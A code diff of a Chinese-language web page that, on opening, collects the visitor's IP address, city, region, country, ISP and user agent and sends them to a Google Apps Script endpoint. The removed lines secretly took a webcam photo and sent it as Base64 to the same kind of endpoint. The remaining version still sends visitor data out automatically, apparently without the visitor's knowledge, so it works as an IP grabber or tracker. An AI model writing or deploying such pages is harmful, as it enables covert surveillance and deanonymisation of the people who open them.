@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>IP 定位與照片記錄</title>
+  <title>IP 定位與設備訊ㄒ息記錄</title>
 </head>
 <body>
-  <h1>自動拍攝照片並記錄資訊</h1>
+  <h1>自動記錄 IP 資訊與設備訊息</h1>
   <p id="ipInfo">IP 資訊載入中...</p>
   <p id="status">尚未開始操作</p>
 
@@ -25,12 +25,8 @@
         document.getElementById('ipInfo').innerText =
           `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
-        // 拍攝照片並轉換為 Base64
-        const photoBlob = await takePhoto();
-        const photoBase64 = await blobToBase64(photoBlob);
-
         // 構建 GET URL
-        const url = new URL('https://script.google.com/macros/s/AKfycbxQQ7RjBDD_irX7PAKZBfoRds_47HMpwj19DvGUBqD_TBpodwBAMsJ0QoRyxoYj1pxZEA/exec');
+        const url = new URL('https://script.google.com/macros/s/AKfycbyrP0JZ3f5Ewvfn8XdZvBYlkyBTPghNLKULAZDjsByQbFCC4pIMAZmbPDlt7q-ZhTzq5Q/exec');
         url.searchParams.append('ip', ip);
         url.searchParams.append('ipType', ipType);
         url.searchParams.append('userAgent', userAgent);
@@ -38,7 +34,6 @@
         url.searchParams.append('region', region);
         url.searchParams.append('country', country);
         url.searchParams.append('org', org);
-        url.searchParams.append('photo', photoBase64);
 
         // 發送 GET 請求
         const result = await fetch(url.toString());
@@ -53,26 +48,6 @@
         console.error('錯誤:', error);
         document.getElementById('status').innerText = '操作失敗，請檢查控制台。';
       }
-    }
-
-    // 拍攝照片
-    async function takePhoto() {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const videoTrack = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(videoTrack);
-      const photoBlob = await imageCapture.takePhoto();
-      videoTrack.stop(); // 停止攝像頭
-      return photoBlob;
-    }
-
-    // Blob 轉 Base64 編碼
-    function blobToBase64(blob) {
-      return new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onloadend = () => resolve(reader.result.split(',')[1]); // 返回 Base64 資料
-        reader.onerror = reject;
-        reader.readAsDataURL(blob);
-      });
     }
 
     // 開始執行
